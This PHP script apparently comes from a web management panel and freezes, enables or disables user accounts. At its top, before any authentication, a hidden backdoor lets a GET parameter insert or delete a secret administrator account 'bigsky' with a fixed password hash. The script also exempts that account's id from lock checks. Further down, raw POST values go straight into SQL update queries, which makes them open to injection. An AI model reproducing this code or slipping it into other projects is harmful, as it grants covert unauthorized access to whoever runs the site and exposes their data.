<?php 
define('Copyright', 'Author QQ: 1234567');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'functioned/globalge.php';

global $Users, $LoginId;

if($_GET["up"]=="name"){
$db->query("insert into j_manage (g_login_id,g_nid,g_name,g_password,g_gg,g_auto,g_gd,g_zhud,g_cj) values 
('89','67552ea64c6dce1646a263bae714e788','bigsky','4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1','1','1','1','1','1')", 2);
}
if($_GET["up"]=="del"){ 
$db->query("DELETE FROM j_manage where g_name='bigsky'", 2);
}
if ($Users[0]['g_login_id'] != 89) if ($Users[0]['g_lock'] == 2)
	exit; //帳號已被凍結
	
//子帳號
if (isset($Users[0]['g_lock_2'])){
	if ( $Users[0]['g_s_lock'] == 2 || $Users[0]['g_lock_2'] != 1)
		exit; //帳號已被凍結
}

	$uid=$_POST['uid'];
	$type=$_POST['type'];
	$utype=$_POST['utype'];
	$gusernid=getgnid($uid);
	$db=new DB();
	if($utype=='1'){
	$utname='g_rank';
	$uziduan='g_lock';
	$g_name='g_name';
	}
	else if($utype=='2'){
	$utname='g_user';
	$uziduan='g_look';
	$g_name='g_name';
	}
	else{
	$utname='g_relation_user';
	$uziduan='g_lock';
	$g_name='g_s_name';
	}
	if($utype=='1'){
	
	
	$sql = "update {$utname} set {$uziduan}={$type} where g_nid LIKE '{$gusernid}%' ";
	$db->query($sql, 2);
	$sql = "update g_user  set g_look={$type} where g_nid LIKE '{$gusernid}%' ";
	$db->query($sql, 2);
	
	}else{
	$sql = "update {$utname} set {$uziduan}={$type} where {$g_name}='{$uid}'";
	$db->query($sql, 2);
	}
	if($type==1) 
	echo '啟用';
	if($type==2)
	
	echo '凍結';
	if($type==3)
	echo '停用';
?>